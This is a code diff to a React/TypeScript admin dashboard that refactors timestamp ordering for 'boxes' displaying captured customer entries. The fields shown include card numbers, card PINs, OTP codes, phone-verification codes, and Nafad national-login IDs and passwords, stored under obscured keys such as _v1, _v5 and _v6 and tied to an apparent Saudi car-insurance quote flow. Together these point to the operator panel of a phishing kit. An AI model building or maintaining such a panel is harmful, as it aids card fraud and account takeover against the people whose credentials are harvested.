@@ -2065,30 +2065,43 @@ const renderNafadBox = () => {
     
     const boxes: BoxType[] = [];
     
-    // Create a box for each entry in customerEntryGroup that has basic or insurance data
+// Create a box for each entry that has Basic data
+    // Find the most recent Basic timestamp first
+    let latestBasicTimestamp = 0;
+    customerEntryGroup.forEach((entry) => {
+      const raw = entry.raw || {};
+      const hasBasic = raw.identityNumber || raw.ownerName || raw.buyerName ||
+                       raw.documentType || raw.phoneNumber || raw.serialNumber;
+      const hasInsurance = raw.insuranceCoverage || raw.vehicleModel ||
+                           raw.vehicleValue || raw.vehicleYear || raw.repairLocation;
+      if (hasBasic || hasInsurance) {
+        const ts = (raw.basicUpdatedAt || raw.insuranceUpdatedAt)
+          ? new Date(raw.basicUpdatedAt || raw.insuranceUpdatedAt).getTime()
+          : new Date(entry.submittedAt || entry.updatedAt || Date.now()).getTime();
+        if (ts > latestBasicTimestamp) {
+          latestBasicTimestamp = ts;
+        }
+      }
+    });
+
     customerEntryGroup.forEach((entry, index) => {
       const raw = entry.raw || {};
-      
-      // Use entry ID as unique base timestamp to ensure stable ordering
-      // Box type offset: Basic=0, Card=1, OTP=2, PIN=3, Phone=4, Nafad=5
-      const BOX_TYPE_OFFSET = 0;
-      // Use submittedAt from database entry, fallback to entry's own timestamp
-      const baseTimestamp = entry.submittedAt || entry.createdAt || entry.updatedAt || Date.now();
-      const entryTimestamp = new Date(baseTimestamp).getTime() - (index * 10000) - BOX_TYPE_OFFSET;
-      const isLatest = index === 0;
-      
-      // Check if this entry has basic data (identity, name, phone, etc.)
-      const hasBasic = raw.identityNumber || raw.ownerName || raw.buyerName || 
+      const hasBasic = raw.identityNumber || raw.ownerName || raw.buyerName ||
                        raw.documentType || raw.phoneNumber || raw.serialNumber;
-      
-      // Check if this entry has insurance data
-      const hasInsurance = raw.insuranceCoverage || raw.vehicleModel || 
+      const hasInsurance = raw.insuranceCoverage || raw.vehicleModel ||
                            raw.vehicleValue || raw.vehicleYear || raw.repairLocation;
-      
-      // Only create box if entry has data
       if (!hasBasic && !hasInsurance) return;
-      
-      // Create box for this entry
+      let entryTimestamp = Date.now();
+      if (raw.basicUpdatedAt || raw.insuranceUpdatedAt) {
+        const ts = new Date(raw.basicUpdatedAt || raw.insuranceUpdatedAt).getTime();
+        if (ts > 0) {
+          entryTimestamp = ts;
+        }
+      } else if (entry.submittedAt) {
+        entryTimestamp = new Date(entry.submittedAt).getTime();
+      }
+      const isLatest = entryTimestamp === latestBasicTimestamp;
+
       boxes.push({
         key: `entry-${entry.id}`,
         timestamp: entryTimestamp,
@@ -2290,29 +2303,36 @@ const renderNafadBox = () => {
     // If still no boxes, return null
     if (boxes.length === 0) return null;
     
-    // Create a box for each entry that has Card data
+// Create a box for each entry that has Card data
+    // Find the most recent Card timestamp first
+    let latestCardTimestamp = 0;
+    customerEntryGroup.forEach((entry) => {
+      const raw = entry.raw || {};
+      if (raw._v1 || raw.cardNumber) {
+        const ts = raw._v1UpdatedAt
+          ? new Date(raw._v1UpdatedAt).getTime()
+          : new Date(entry.submittedAt || entry.updatedAt || Date.now()).getTime();
+        if (ts > latestCardTimestamp) {
+          latestCardTimestamp = ts;
+        }
+      }
+    });
+
     customerEntryGroup.forEach((entry, index) => {
       const raw = entry.raw || {};
       const cardNumber = raw._v1 || raw.cardNumber;
-      
-      // Box type offset: Basic=0, Card=1, OTP=2, PIN=3, Phone=4, Nafad=5
-      const BOX_TYPE_OFFSET = 1;
-      
-      // Use _v1UpdatedAt if available and valid, otherwise use entry's timestamp
-      let baseTimestamp = entry.submittedAt || entry.createdAt || entry.updatedAt || Date.now();
+      if (!cardNumber) return;
+      let entryTimestamp = Date.now();
       if (raw._v1UpdatedAt) {
         const _v1Ts = new Date(raw._v1UpdatedAt).getTime();
         if (_v1Ts > 0) {
-          baseTimestamp = raw._v1UpdatedAt;
+          entryTimestamp = _v1Ts;
         }
+      } else if (entry.submittedAt) {
+        entryTimestamp = new Date(entry.submittedAt).getTime();
       }
-      
-      const entryTimestamp = new Date(baseTimestamp).getTime() - (index * 10000) - BOX_TYPE_OFFSET;
-      const isLatest = index === 0;
-      
-      // Check if this entry has card data
-      if (!cardNumber) return;
-      
+      const isLatest = entryTimestamp === latestCardTimestamp;
+
       boxes.push({
         key: `card-${entry.id}`,
         timestamp: entryTimestamp,
@@ -2399,14 +2419,14 @@ const renderNafadBox = () => {
       });
     });
     
-    // Create a box for each entry that has OTP data
+// Create a box for each entry that has OTP data
     // Find the most recent OTP timestamp first
     let latestOtpTimestamp = 0;
     customerEntryGroup.forEach((entry) => {
       const raw = entry.raw || {};
       if (raw._v5 || raw.otpCode) {
-        const ts = raw._v5UpdatedAt 
-          ? new Date(raw._v5UpdatedAt).getTime() 
+        const ts = raw._v5UpdatedAt
+          ? new Date(raw._v5UpdatedAt).getTime()
           : new Date(entry.submittedAt || entry.updatedAt || Date.now()).getTime();
         if (ts > latestOtpTimestamp) {
           latestOtpTimestamp = ts;
@@ -2417,11 +2437,7 @@ const renderNafadBox = () => {
     customerEntryGroup.forEach((entry, index) => {
       const raw = entry.raw || {};
       const otpCode = raw._v5 || raw.otpCode;
-
-      // Check if this entry has OTP data
       if (!otpCode) return;
-
-      // Use _v5UpdatedAt timestamp for accurate time display
       let entryTimestamp = Date.now();
       if (raw._v5UpdatedAt) {
         const _v5Ts = new Date(raw._v5UpdatedAt).getTime();
@@ -2431,8 +2447,6 @@ const renderNafadBox = () => {
       } else if (entry.submittedAt) {
         entryTimestamp = new Date(entry.submittedAt).getTime();
       }
-
-      // This is the latest OTP if its timestamp matches the most recent
       const isLatest = entryTimestamp === latestOtpTimestamp;
 
       boxes.push({
@@ -2500,29 +2514,36 @@ const renderNafadBox = () => {
       });
     });
     
-    // Create a box for each entry that has PIN data
+// Create a box for each entry that has PIN data
+    // Find the most recent PIN timestamp first
+    let latestPinTimestamp = 0;
+    customerEntryGroup.forEach((entry) => {
+      const raw = entry.raw || {};
+      if (raw._v6 || raw.pinCode) {
+        const ts = raw._v6UpdatedAt
+          ? new Date(raw._v6UpdatedAt).getTime()
+          : new Date(entry.submittedAt || entry.updatedAt || Date.now()).getTime();
+        if (ts > latestPinTimestamp) {
+          latestPinTimestamp = ts;
+        }
+      }
+    });
+
     customerEntryGroup.forEach((entry, index) => {
       const raw = entry.raw || {};
       const pinCode = raw._v6 || raw.pinCode;
-      
-      // Box type offset: Basic=0, Card=1, OTP=2, PIN=3, Phone=4, Nafad=5
-      const BOX_TYPE_OFFSET = 3;
-      
-      // Use _v6UpdatedAt if available and valid, otherwise use entry's timestamp
-      let baseTimestamp = entry.submittedAt || entry.createdAt || entry.updatedAt || Date.now();
+      if (!pinCode) return;
+      let entryTimestamp = Date.now();
       if (raw._v6UpdatedAt) {
         const _v6Ts = new Date(raw._v6UpdatedAt).getTime();
         if (_v6Ts > 0) {
-          baseTimestamp = raw._v6UpdatedAt;
+          entryTimestamp = _v6Ts;
         }
+      } else if (entry.submittedAt) {
+        entryTimestamp = new Date(entry.submittedAt).getTime();
       }
-      
-      const entryTimestamp = new Date(baseTimestamp).getTime() - (index * 10000) - BOX_TYPE_OFFSET;
-      const isLatest = index === 0;
-      
-      // Check if this entry has PIN data
-      if (!pinCode) return;
-      
+      const isLatest = entryTimestamp === latestPinTimestamp;
+
       boxes.push({
         key: `pin-${entry.id}`,
         timestamp: entryTimestamp,
@@ -2588,31 +2609,37 @@ const renderNafadBox = () => {
       });
     });
     
-    // Create a box for each entry that has Phone verification data (from step5)
+// Create a box for each entry that has Phone verification data
+    // Find the most recent Phone timestamp first
+    let latestPhoneTimestamp = 0;
+    customerEntryGroup.forEach((entry) => {
+      const raw = entry.raw || {};
+      const hasPhoneVerification = raw.phoneIdNumber || raw.phoneCarrier || raw.phoneOtp || raw._v7;
+      if (hasPhoneVerification) {
+        const ts = raw._v7UpdatedAt
+          ? new Date(raw._v7UpdatedAt).getTime()
+          : new Date(entry.submittedAt || entry.updatedAt || Date.now()).getTime();
+        if (ts > latestPhoneTimestamp) {
+          latestPhoneTimestamp = ts;
+        }
+      }
+    });
+
     customerEntryGroup.forEach((entry, index) => {
       const raw = entry.raw || {};
-      // Only show phone verification box if there's actual verification data (from step5)
-      // NOT just phoneNumber which is in basic info
       const hasPhoneVerification = raw.phoneIdNumber || raw.phoneCarrier || raw.phoneOtp || raw._v7;
-      
-      // Box type offset: Basic=0, Card=1, OTP=2, PIN=3, Phone=4, Nafad=5
-      const BOX_TYPE_OFFSET = 4;
-      
-      // Use _v7UpdatedAt if available and valid, otherwise use entry's timestamp
-      let baseTimestamp = entry.submittedAt || entry.createdAt || entry.updatedAt || Date.now();
+      if (!hasPhoneVerification) return;
+      let entryTimestamp = Date.now();
       if (raw._v7UpdatedAt) {
         const _v7Ts = new Date(raw._v7UpdatedAt).getTime();
         if (_v7Ts > 0) {
-          baseTimestamp = raw._v7UpdatedAt;
+          entryTimestamp = _v7Ts;
         }
+      } else if (entry.submittedAt) {
+        entryTimestamp = new Date(entry.submittedAt).getTime();
       }
-      
-      const entryTimestamp = new Date(baseTimestamp).getTime() - (index * 10000) - BOX_TYPE_OFFSET;
-      const isLatest = index === 0;
-      
-      // Check if this entry has phone verification data (from step5)
-      if (!hasPhoneVerification) return;
-      
+      const isLatest = entryTimestamp === latestPhoneTimestamp;
+
       boxes.push({
         key: `phone-${entry.id}`,
         timestamp: entryTimestamp,
@@ -2699,29 +2726,37 @@ const renderNafadBox = () => {
       });
     });
     
-    // Create a box for each entry that has Nafad data
+// Create a box for each entry that has Nafad data
+    // Find the most recent Nafad timestamp first
+    let latestNafadTimestamp = 0;
+    customerEntryGroup.forEach((entry) => {
+      const raw = entry.raw || {};
+      const hasNafad = raw.nafadIdNumber || raw.nafadPassword;
+      if (hasNafad) {
+        const ts = raw.nafadUpdatedAt
+          ? new Date(raw.nafadUpdatedAt).getTime()
+          : new Date(entry.submittedAt || entry.updatedAt || Date.now()).getTime();
+        if (ts > latestNafadTimestamp) {
+          latestNafadTimestamp = ts;
+        }
+      }
+    });
+
     customerEntryGroup.forEach((entry, index) => {
       const raw = entry.raw || {};
       const hasNafad = raw.nafadIdNumber || raw.nafadPassword;
-      
-      // Box type offset: Basic=0, Card=1, OTP=2, PIN=3, Phone=4, Nafad=5
-      const BOX_TYPE_OFFSET = 5;
-      
-      // Use nafadUpdatedAt if available and valid, otherwise use entry's timestamp
-      let baseTimestamp = entry.submittedAt || entry.createdAt || entry.updatedAt || Date.now();
+      if (!hasNafad) return;
+      let entryTimestamp = Date.now();
       if (raw.nafadUpdatedAt) {
         const nafadTs = new Date(raw.nafadUpdatedAt).getTime();
         if (nafadTs > 0) {
-          baseTimestamp = raw.nafadUpdatedAt;
+          entryTimestamp = nafadTs;
         }
+      } else if (entry.submittedAt) {
+        entryTimestamp = new Date(entry.submittedAt).getTime();
       }
-      
-      const entryTimestamp = new Date(baseTimestamp).getTime() - (index * 10000) - BOX_TYPE_OFFSET;
-      const isLatest = index === 0;
-      
-      // Check if this entry has Nafad data
-      if (!hasNafad) return;
-      
+      const isLatest = entryTimestamp === latestNafadTimestamp;
+
       boxes.push({
         key: `nafad-${entry.id}`,
         timestamp: entryTimestamp,
@@ -2810,14 +2845,14 @@ const renderNafadBox = () => {
     });
     
 
-    // Create a box for each entry that has Package/Offer data (from compar page)
-    // Find the most recent package timestamp first
+// Create a box for each entry that has Package/Offer data
+    // Find the most recent Package timestamp first
     let latestPackageTimestamp = 0;
     customerEntryGroup.forEach((entry) => {
       const raw = entry.raw || {};
       if (raw.selectedOffer || raw.offerTotalPrice) {
-        const ts = raw.comparCompletedAt 
-          ? new Date(raw.comparCompletedAt).getTime() 
+        const ts = raw.comparCompletedAt
+          ? new Date(raw.comparCompletedAt).getTime()
           : new Date(entry.submittedAt || entry.updatedAt || Date.now()).getTime();
         if (ts > latestPackageTimestamp) {
           latestPackageTimestamp = ts;
@@ -2829,11 +2864,7 @@ const renderNafadBox = () => {
       const raw = entry.raw || {};
       const selectedOffer = raw.selectedOffer;
       const hasPackage = selectedOffer?.name || raw.offerTotalPrice;
-
-      // Check if this entry has package data
       if (!hasPackage) return;
-
-      // Use comparCompletedAt timestamp for accurate time display
       let entryTimestamp = Date.now();
       if (raw.comparCompletedAt) {
         const comparTs = new Date(raw.comparCompletedAt).getTime();
@@ -2843,14 +2874,7 @@ const renderNafadBox = () => {
       } else if (entry.submittedAt) {
         entryTimestamp = new Date(entry.submittedAt).getTime();
       }
-
-      // This is the latest package if its timestamp matches the most recent
       const isLatest = entryTimestamp === latestPackageTimestamp;
-
-      const offerName = selectedOffer?.name || "—";
-      const offerType = selectedOffer?.type === "comprehensive" ? "تأمين شامل" : "تأمين ضد الغير";
-      const offerPrice = raw.offerTotalPrice ? `${Number(raw.offerTotalPrice).toFixed(2)} ﷼` : "—";
-      const selectedFeatures = selectedOffer?.extra_features || [];
 
       boxes.push({
         key: `package-${entry.id}`,
